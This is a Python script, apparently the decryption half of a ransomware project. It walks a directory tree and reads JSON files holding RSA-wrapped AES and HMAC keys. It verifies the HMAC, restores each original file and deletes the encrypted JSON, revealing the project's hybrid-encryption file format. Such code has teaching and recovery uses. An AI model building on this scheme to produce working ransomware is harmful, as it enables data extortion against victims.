from base64 import b64encode, b64decode
import encryption, constants, os, json, cryptools

'''

Decrypts everything in the directory
where this program is executed.

'''


def main():

	folder_path = '..'

	rsa_cipher = encryption.AsymmetricCipher(constants.RSA_FOLDER_PATH)

	for current_directory, sub_directories, sub_files in os.walk(folder_path):

		if 'ransomware' in current_directory.lower():
			continue

		for file in sub_files:

			if 'json' not in file:
				continue
				
			with open(os.path.join(current_directory, file), 'r') as js:
				json_dict = json.load(js)

			fileName = ''.join(file.split('.')[:-1])

			tag = b64decode(json_dict['TAG'])

			cipherkeys = b64decode(json_dict['KEY'])
			
			cipherkeys = rsa_cipher.Decrypt(cipherkeys)

			ciphertext = b64decode(json_dict['CIPHER'])

			aes_key, hmac_key = (cipherkeys[:constants.AES_KEY_LENGTH], cipherkeys[constants.AES_KEY_LENGTH:])

			aes_iv = b64decode(json_dict['IV'])

			ext = b64decode(json_dict['EXT'])

			aes_cipher = encryption.SymmetricCipher(aes_key, aes_iv)

			if cryptools.HMAC(ciphertext, hmac_key) != tag:
				print('Ciphertext has been changed for %s ', file)

			with open(os.path.join(current_directory, fileName + '.' + ext), 'wb') as f:
				f.write(aes_cipher.Decrypt(ciphertext))

			print('\n[+] Decrypted %s\n' % os.path.join(current_directory, fileName + '.' + ext))

			os.remove(os.path.join(current_directory, file))



if __name__ == '__main__':
	main()
